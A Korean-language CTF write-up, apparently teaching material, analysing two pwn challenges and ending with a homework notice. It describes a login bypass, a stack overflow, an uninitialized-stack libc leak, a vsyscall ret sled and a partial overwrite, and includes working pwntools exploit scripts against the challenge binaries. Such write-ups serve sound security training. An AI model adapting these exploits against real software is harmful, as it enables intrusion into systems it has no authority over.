# exploitable

### Binary Reversing

이 바이너리를 실행하면 4개의 메뉴가 뜬다. 

```
1.Login
2.Exploit
3.Leak
4.Exit
```

1번 메뉴에서는 로그인 기능, 2번 메뉴에서는 취약점 트리거 기능, 3번 메뉴에서는 admin id 릭 기능이 구현되어있다.
참고로 4보다 큰 수를 메뉴 입력으로 주면 0xc58 함수를 다시 호출할 수 있다.

### Vulnerability

Login 기능에서 \x00을 입력으로 주면 로그인을 간단히 우회할 수가 있다. 그 후 3번에서 admin id를 알아낼 수 있다.(간단한 덧셈문제만 풀면 됨)
이 프로그램의 취약점은 아주 명료하다. 바로 2번 Exploit메뉴에서의 스택 버퍼오버플로우이다. 
그러나 8의 배수의 길이로만 페이로드를 넣어야하고, 그렇지 않으면 8의 배수에 맞추어 null byte를 붙인다. PIE가 걸려있으므로 주소 leak을 하거나 partial overwrite 등의 방법을 고려해볼 수 있겠으나 이 둘 모두 불가능한 상태이다. 그러면 다른 취약점이 또 있나 찾아보도록 하겠다. 
3번 Leak메뉴를 보면 정수를 입력받아 ```rbp-0x50```에 넣고, ```rbp-0x48```에 그 값을 더한다. 그러나 음수를 입력으로 넣으면 초기화되지 않은 ```rbp-0x48```에 그 값을 더할 수 있다. 그렇다면 이를 이용해 exploit을 해보도록 하겠다.

### Exploit

IDA로 hex-ray 했을 땐 보이지 않지만, 0x9e0 함수를 보면 stack에 stdin, stdout, stderr 값을 넣는다. 이는 LIBC에 있는 주소이므로 스택에 LIBC 주소가 들어간단 뜻이다. 위에서 언급한 0xc58 함수로의 재귀 기능을 이용하여 스택을 잘 움직여 3번 Leak 기능으로 LIBC 값 one_gadget 주소로 바꾼 후 vsyscall ret sled를 이용하면 exploit할 수 있다. 

```
#!/usr/bin/python

from pwn import *
import time

DEBUG=0
s=process("./exploitable_for_challenger",env={"LD_PRELOAD":"./libc.so.6"})
#s=remote('192.168.50.151',21227)

def login(id):
    s.sendline("1")
    s.recvuntil(":\n")
    s.sendline(id)
    s.recvuntil("Exit\n")

def leak(value):
    s.sendline("3")
    s.recvuntil("positive x\n")
    s.sendline(str(value))
    return s.recvuntil("Exit\n")

def exploit(payload,a=0):
    s.sendline("2")
    time.sleep(0.1)
    if DEBUG:
        s.send("*"*41+"\x00"*7)
    else:
        s.send("hello_administrator_you_are_good_at_math!"+"\x00"*7)

    time.sleep(0.1)
    s.recvuntil("exploit!")
    if a:
        pause()
    s.send(payload)

def recall():
    s.sendline("5")
    s.recvuntil("Exit\n")

login("\x00")
leak(-0x3802d6)
recall()
recall()
exploit(p64(0xffffffffff600000)*(0x2c+9),1)
s.interactive()
```




# First

### Exploit

이 문제는 소스코드가 제공되었기 때문에 분석 단계는 건너뛰도록 하겠다.
```handle_request```함수에서 ```require_auth``` 함수를 부르고, 거기서 ```check_password_correct``` 함수를 부른다. ```check_password_correct```함수에서 90바이트까지 입력을 넣을 수 있는데, 입력받는 버퍼가 ```rbp-0x48```에 위치해 있으므로 buffer overflow가 터진다. PIE가 걸려있기 때문에 ROP는 불가능하고, Partial Overwrite를 통해 flag를 읽어야한다. ```handle_request```에서 ```require_auth```를 call할 때 스택에 ```code+0x105b```의 주소를 push하는데, 이는 flag파일을 읽어와 출력해주는 코드의 주소이다. 그러면 이 주소를 이용해 exploit해보도록 하겠다. exploit 성공 확률은 대략 1/16이다.

```
#!/usr/bin/python

from pwn import *

s=remote('localhost',1514)

s.recvuntil("password: ")

s.sendline(str(0x5a))

pay = "A"*0x48
pay += p64(0xffffffffff600000)*2
pay += "\x8b\x80"

s.sendline(pay)

s.interactive()
```



# Assignments

Second, Third 를 푼 사람이 거의 없기 때문에 이 두문제 + 첨부된 하나의 문제 중 하나 이상을 제출해주시면 됩니다. Second나 Third를 풀었던 사람은 과제를 해도되고 안해도됩니다.

Second 힌트 : index under(over)flow
